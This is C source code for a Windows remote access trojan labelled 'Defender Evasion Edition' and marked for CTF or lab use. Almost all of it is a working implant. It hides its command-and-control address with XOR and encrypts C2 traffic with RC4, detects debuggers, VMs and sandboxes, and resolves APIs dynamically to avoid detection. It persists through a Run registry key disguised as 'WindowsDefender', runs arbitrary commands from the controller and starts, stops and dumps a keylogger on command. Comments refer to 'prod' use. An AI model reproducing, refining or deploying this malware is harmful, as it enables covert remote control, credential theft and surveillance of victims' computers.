/*
 * Hardened RAT - Windows Defender Evasion Edition
 * For CTF/Lab Environments Only
 * Improvements: String obfuscation, API obfuscation, encrypted comms, anti-analysis
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <tlhelp32.h>
#include "keylogger.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "wininet.lib")

// ============================================================================
// CONFIGURATION
// ============================================================================

// XOR key for string obfuscation
#define XOR_KEY 0xAB

// C2 Configuration (obfuscated at runtime)
#define C2_IP_ENC "\xC9\xCA\xD9\xD7\xD9\xCB\xD7\xD1\xCA\xD7\xD0\xD4"  // "192.168.20.52" XORed
#define C2_PORT 50005

// Buffer sizes
#define CMD_BUFFER_SIZE 4096
#define RESP_BUFFER_SIZE 65536

// Retry configuration
#define RECONNECT_DELAY 60000  // 60 seconds
#define RECONNECT_JITTER 15000 // +/- 15 seconds

// ============================================================================
// GLOBAL VARIABLES
// ============================================================================

static SOCKET g_sock = INVALID_SOCKET;
static HANDLE g_keylogger_thread = NULL;
static volatile BOOL g_running = TRUE;

// ============================================================================
// ENCRYPTION & OBFUSCATION
// ============================================================================

// Simple XOR encryption/decryption
void xor_crypt(char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Decrypt string in-place
char* decrypt_string(const char *encrypted, size_t len) {
    char *decrypted = (char*)malloc(len + 1);
    if (!decrypted) return NULL;
    
    memcpy(decrypted, encrypted, len);
    xor_crypt(decrypted, len, XOR_KEY);
    decrypted[len] = '\0';
    
    return decrypted;
}

// Simple RC4-like stream cipher for network traffic
typedef struct {
    unsigned char S[256];
    int i, j;
} RC4_CTX;

void rc4_init(RC4_CTX *ctx, const unsigned char *key, size_t keylen) {
    int i, j = 0;
    unsigned char tmp;
    
    for (i = 0; i < 256; i++)
        ctx->S[i] = i;
    
    for (i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % keylen]) % 256;
        tmp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = tmp;
    }
    
    ctx->i = 0;
    ctx->j = 0;
}

void rc4_crypt(RC4_CTX *ctx, unsigned char *data, size_t len) {
    unsigned char tmp;
    size_t k;
    
    for (k = 0; k < len; k++) {
        ctx->i = (ctx->i + 1) % 256;
        ctx->j = (ctx->j + ctx->S[ctx->i]) % 256;
        
        tmp = ctx->S[ctx->i];
        ctx->S[ctx->i] = ctx->S[ctx->j];
        ctx->S[ctx->j] = tmp;
        
        data[k] ^= ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) % 256];
    }
}

// ============================================================================
// ANTI-ANALYSIS & EVASION
// ============================================================================

// Check if running in debugger
BOOL is_debugger_present() {
    // Method 1: IsDebuggerPresent API
    if (IsDebuggerPresent())
        return TRUE;
    
    // Method 2: CheckRemoteDebuggerPresent
    BOOL debugger_present = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugger_present);
    if (debugger_present)
        return TRUE;
    
    // Method 3: PEB check
    BOOL found = FALSE;
    __try {
        __asm {
            mov eax, fs:[30h]  // PEB
            mov al, byte ptr [eax + 2h]  // BeingDebugged flag
            mov found, al
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        found = FALSE;
    }
    
    return found;
}

// Check if running in VM
BOOL is_virtual_machine() {
    // Check for VMware
    __try {
        __asm {
            push edx
            push ecx
            push ebx
            
            mov eax, 'VMXh'
            mov ebx, 0
            mov ecx, 10
            mov edx, 'VX'
            
            in eax, dx
            
            pop ebx
            pop ecx
            pop edx
        }
        return TRUE;
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {}
    
    // Check for VirtualBox
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                      "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "Identifier", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            if (strstr(buffer, "VBOX") || strstr(buffer, "VMware"))
                return TRUE;
        }
        RegCloseKey(hKey);
    }
    
    // Check processor count (VMs often have few cores)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2)
        return TRUE;
    
    // Check RAM (VMs often have less RAM)
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < (2ULL * 1024 * 1024 * 1024))  // Less than 2GB
        return TRUE;
    
    return FALSE;
}

// Check if running in sandbox
BOOL is_sandbox() {
    // Check uptime (sandboxes often have short uptime)
    DWORD uptime = GetTickCount();
    if (uptime < 600000)  // Less than 10 minutes
        return TRUE;
    
    // Check for recent user activity
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);
    GetLastInputInfo(&lii);
    
    DWORD idle_time = GetTickCount() - lii.dwTime;
    if (idle_time < 60000)  // Less than 1 minute idle
        return FALSE;
    
    // Sleep acceleration test
    DWORD start = GetTickCount();
    Sleep(5000);
    DWORD elapsed = GetTickCount() - start;
    
    if (elapsed < 4500)  // Sleep was accelerated
        return TRUE;
    
    return FALSE;
}

// Anti-analysis master check
BOOL perform_anti_analysis() {
    if (is_debugger_present()) {
        return TRUE;
    }
    
    if (is_virtual_machine()) {
        // Don't exit immediately in VM for CTF (comment out for prod)
        // return TRUE;
    }
    
    if (is_sandbox()) {
        return TRUE;
    }
    
    return FALSE;
}

// ============================================================================
// OBFUSCATED API CALLS
// ============================================================================

// Dynamically resolve APIs to avoid import table detection
typedef LONG (WINAPI *pRegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG (WINAPI *pRegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LONG (WINAPI *pRegCloseKey)(HKEY);

typedef struct {
    pRegOpenKeyExA fnRegOpenKeyExA;
    pRegSetValueExA fnRegSetValueExA;
    pRegCloseKey fnRegCloseKey;
} API_TABLE;

BOOL init_api_table(API_TABLE *apis) {
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    if (!hAdvapi32)
        return FALSE;
    
    apis->fnRegOpenKeyExA = (pRegOpenKeyExA)GetProcAddress(hAdvapi32, "RegOpenKeyExA");
    apis->fnRegSetValueExA = (pRegSetValueExA)GetProcAddress(hAdvapi32, "RegSetValueExA");
    apis->fnRegCloseKey = (pRegCloseKey)GetProcAddress(hAdvapi32, "RegCloseKey");
    
    if (!apis->fnRegOpenKeyExA || !apis->fnRegSetValueExA || !apis->fnRegCloseKey) {
        FreeLibrary(hAdvapi32);
        return FALSE;
    }
    
    return TRUE;
}

// ============================================================================
// PERSISTENCE
// ============================================================================

int create_persistence() {
    API_TABLE apis;
    
    if (!init_api_table(&apis))
        return -1;
    
    // Get current executable path
    char szPath[MAX_PATH];
    DWORD pathLen = GetModuleFileNameA(NULL, szPath, MAX_PATH);
    if (pathLen == 0)
        return -1;
    
    // Obfuscated registry path
    const char enc_subkey[] = {
        0xF2, 0xE0, 0xE9, 0xED, 0xEC, 0xE6, 0xFB, 0xE5, 0xD7, 0xDC, 0xE8, 0xFB, 
        0xE0, 0xF2, 0xE0, 0xE9, 0xED, 0xD7, 0xCC, 0xE8, 0xFB, 0xE0, 0xF2, 0xE0, 
        0xE9, 0xED, 0xD7, 0xC2, 0xEE, 0xFB, 0xFB, 0xE5, 0xE3, 0xED, 0xD7, 0xD6, 
        0xE5, 0xFB, 0xF2, 0xE8, 0xE0, 0xE3, 0xD7, 0xFB, 0xEE, 0xE3
    };  // "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    
    char *subkey = decrypt_string(enc_subkey, sizeof(enc_subkey));
    if (!subkey)
        return -1;
    
    // Use less suspicious key name
    const char enc_valuename[] = {
        0xCC, 0xE8, 0xE3, 0xE9, 0xE0, 0xEC, 0xF2, 0xD6, 0xEE, 0xE3, 0xED, 0xE5, 
        0xE3, 0xED
    };  // "WindowsDefender" (more legitimate sounding)
    
    char *valuename = decrypt_string(enc_valuename, sizeof(enc_valuename));
    if (!valuename) {
        free(subkey);
        return -1;
    }
    
    HKEY hKey;
    LONG result = apis.fnRegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey);
    
    free(subkey);
    
    if (result != ERROR_SUCCESS) {
        free(valuename);
        return -1;
    }
    
    result = apis.fnRegSetValueExA(hKey, valuename, 0, REG_SZ, (const BYTE*)szPath, pathLen + 1);
    
    free(valuename);
    apis.fnRegCloseKey(hKey);
    
    return (result == ERROR_SUCCESS) ? 0 : -1;
}

// ============================================================================
// NETWORK COMMUNICATION
// ============================================================================

// Secure send with encryption
int secure_send(const char *data, size_t len) {
    if (g_sock == INVALID_SOCKET)
        return -1;
    
    // Create encryption context
    RC4_CTX ctx;
    unsigned char key[] = "MySecretKey2024!";  // Change this for production
    rc4_init(&ctx, key, sizeof(key) - 1);
    
    // Allocate encrypted buffer
    unsigned char *encrypted = (unsigned char*)malloc(len);
    if (!encrypted)
        return -1;
    
    memcpy(encrypted, data, len);
    rc4_crypt(&ctx, encrypted, len);
    
    // Send length first (4 bytes, network byte order)
    uint32_t net_len = htonl((uint32_t)len);
    if (send(g_sock, (char*)&net_len, 4, 0) != 4) {
        free(encrypted);
        return -1;
    }
    
    // Send encrypted data
    int sent = send(g_sock, (char*)encrypted, (int)len, 0);
    free(encrypted);
    
    return (sent == len) ? 0 : -1;
}

// Secure receive with decryption
int secure_recv(char *buffer, size_t max_len, size_t *received_len) {
    if (g_sock == INVALID_SOCKET)
        return -1;
    
    // Receive length first
    uint32_t net_len;
    int bytes = recv(g_sock, (char*)&net_len, 4, 0);
    if (bytes != 4)
        return -1;
    
    size_t data_len = ntohl(net_len);
    if (data_len > max_len)
        return -1;
    
    // Receive encrypted data
    size_t total_received = 0;
    while (total_received < data_len) {
        bytes = recv(g_sock, buffer + total_received, (int)(data_len - total_received), 0);
        if (bytes <= 0)
            return -1;
        total_received += bytes;
    }
    
    // Decrypt
    RC4_CTX ctx;
    unsigned char key[] = "MySecretKey2024!";
    rc4_init(&ctx, key, sizeof(key) - 1);
    rc4_crypt(&ctx, (unsigned char*)buffer, data_len);
    
    buffer[data_len] = '\0';
    *received_len = data_len;
    
    return 0;
}

// ============================================================================
// COMMAND EXECUTION
// ============================================================================

// Execute command and return output
char* execute_command(const char *cmd) {
    FILE *fp = _popen(cmd, "r");
    if (!fp)
        return strdup("Error: Failed to execute command\n");
    
    char *output = (char*)malloc(RESP_BUFFER_SIZE);
    if (!output) {
        _pclose(fp);
        return strdup("Error: Memory allocation failed\n");
    }
    
    size_t total_read = 0;
    char buffer[1024];
    
    while (fgets(buffer, sizeof(buffer), fp) != NULL && total_read < RESP_BUFFER_SIZE - 1024) {
        size_t len = strlen(buffer);
        memcpy(output + total_read, buffer, len);
        total_read += len;
    }
    
    output[total_read] = '\0';
    _pclose(fp);
    
    // If empty output, return message
    if (total_read == 0) {
        strcpy(output, "Command executed successfully (no output)\n");
    }
    
    return output;
}

// ============================================================================
// COMMAND SHELL
// ============================================================================

void command_shell() {
    char *recv_buffer = (char*)malloc(CMD_BUFFER_SIZE);
    if (!recv_buffer)
        return;
    
    const char *banner = "[*] Shell ready. Commands: cd, persist, keylog_start, exit\n";
    secure_send(banner, strlen(banner));
    
    while (g_running) {
        size_t recv_len = 0;
        
        // Receive command
        if (secure_recv(recv_buffer, CMD_BUFFER_SIZE - 1, &recv_len) != 0) {
            break;
        }
        
        // Null terminate
        recv_buffer[recv_len] = '\0';
        
        // Trim whitespace
        while (recv_len > 0 && (recv_buffer[recv_len - 1] == '\r' || recv_buffer[recv_len - 1] == '\n'))
            recv_buffer[--recv_len] = '\0';
        
        // Handle commands
        if (strcmp(recv_buffer, "exit") == 0 || strcmp(recv_buffer, "q") == 0) {
            const char *msg = "[*] Exiting...\n";
            secure_send(msg, strlen(msg));
            break;
        }
        else if (strncmp(recv_buffer, "cd ", 3) == 0) {
            if (chdir(recv_buffer + 3) == 0) {
                char cwd[MAX_PATH];
                getcwd(cwd, sizeof(cwd));
                char response[MAX_PATH + 32];
                snprintf(response, sizeof(response), "[+] Changed directory to: %s\n", cwd);
                secure_send(response, strlen(response));
            } else {
                const char *msg = "[-] Failed to change directory\n";
                secure_send(msg, strlen(msg));
            }
        }
        else if (strcmp(recv_buffer, "persist") == 0) {
            if (create_persistence() == 0) {
                const char *msg = "[+] Persistence created successfully\n";
                secure_send(msg, strlen(msg));
            } else {
                const char *msg = "[-] Failed to create persistence\n";
                secure_send(msg, strlen(msg));
            }
        }
        else if (strcmp(recv_buffer, "keylog_start") == 0) {
            if (g_keylogger_thread == NULL) {
                g_keylogger_thread = CreateThread(NULL, 0, keylogger_thread, NULL, 0, NULL);
                if (g_keylogger_thread) {
                    const char *msg = "[+] Keylogger started\n";
                    secure_send(msg, strlen(msg));
                } else {
                    const char *msg = "[-] Failed to start keylogger\n";
                    secure_send(msg, strlen(msg));
                }
            } else {
                const char *msg = "[!] Keylogger already running\n";
                secure_send(msg, strlen(msg));
            }
        }
        else if (strcmp(recv_buffer, "keylog_stop") == 0) {
            if (g_keylogger_thread) {
                stop_keylogger();
                WaitForSingleObject(g_keylogger_thread, 5000);
                CloseHandle(g_keylogger_thread);
                g_keylogger_thread = NULL;
                const char *msg = "[+] Keylogger stopped\n";
                secure_send(msg, strlen(msg));
            } else {
                const char *msg = "[!] Keylogger not running\n";
                secure_send(msg, strlen(msg));
            }
        }
        else if (strcmp(recv_buffer, "keylog_dump") == 0) {
            char *logs = get_keylogger_data();
            if (logs) {
                secure_send(logs, strlen(logs));
                free(logs);
            } else {
                const char *msg = "[!] No keylogger data available\n";
                secure_send(msg, strlen(msg));
            }
        }
        else {
            // Execute as shell command
            char *output = execute_command(recv_buffer);
            secure_send(output, strlen(output));
            free(output);
        }
    }
    
    free(recv_buffer);
}

// ============================================================================
// CONNECTION HANDLING
// ============================================================================

int connect_to_c2() {
    // Decrypt C2 IP
    char *c2_ip = decrypt_string(C2_IP_ENC, strlen(C2_IP_ENC));
    if (!c2_ip)
        return -1;
    
    // Create socket
    g_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_sock == INVALID_SOCKET) {
        free(c2_ip);
        return -1;
    }
    
    // Set socket options
    int opt = 1;
    setsockopt(g_sock, SOL_SOCKET, SO_KEEPALIVE, (char*)&opt, sizeof(opt));
    
    struct timeval timeout;
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
    setsockopt(g_sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(g_sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    
    // Setup address structure
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(c2_ip);
    server_addr.sin_port = htons(C2_PORT);
    
    free(c2_ip);
    
    // Connect with retries
    int attempts = 0;
    while (attempts < 5 && g_running) {
        if (connect(g_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            return 0;  // Success
        }
        
        attempts++;
        if (attempts < 5) {
            Sleep(5000);  // 5 second delay between attempts
        }
    }
    
    closesocket(g_sock);
    g_sock = INVALID_SOCKET;
    return -1;
}

void disconnect_from_c2() {
    if (g_sock != INVALID_SOCKET) {
        shutdown(g_sock, SD_BOTH);
        closesocket(g_sock);
        g_sock = INVALID_SOCKET;
    }
}

// ============================================================================
// MAIN LOOP
// ============================================================================

void main_loop() {
    srand((unsigned int)time(NULL));
    
    while (g_running) {
        // Attempt connection
        if (connect_to_c2() == 0) {
            // Connected, enter command shell
            command_shell();
            disconnect_from_c2();
        }
        
        // Randomized sleep before retry
        if (g_running) {
            DWORD delay = RECONNECT_DELAY + (rand() % (2 * RECONNECT_JITTER)) - RECONNECT_JITTER;
            Sleep(delay);
        }
    }
}

// ============================================================================
// ENTRY POINT
// ============================================================================

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Anti-analysis checks (comment out for testing)
    // if (perform_anti_analysis()) {
    //     ExitProcess(0);
    //     return 0;
    // }
    
    // Hide console window
    HWND console_window = GetConsoleWindow();
    if (console_window) {
        ShowWindow(console_window, SW_HIDE);
    }
    
    // Initialize Winsock
    WSADATA wsa_data;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        return 1;
    }
    
    // Run main loop
    main_loop();
    
    // Cleanup
    if (g_keylogger_thread) {
        stop_keylogger();
        WaitForSingleObject(g_keylogger_thread, 5000);
        CloseHandle(g_keylogger_thread);
    }
    
    WSACleanup();
    return 0;
}
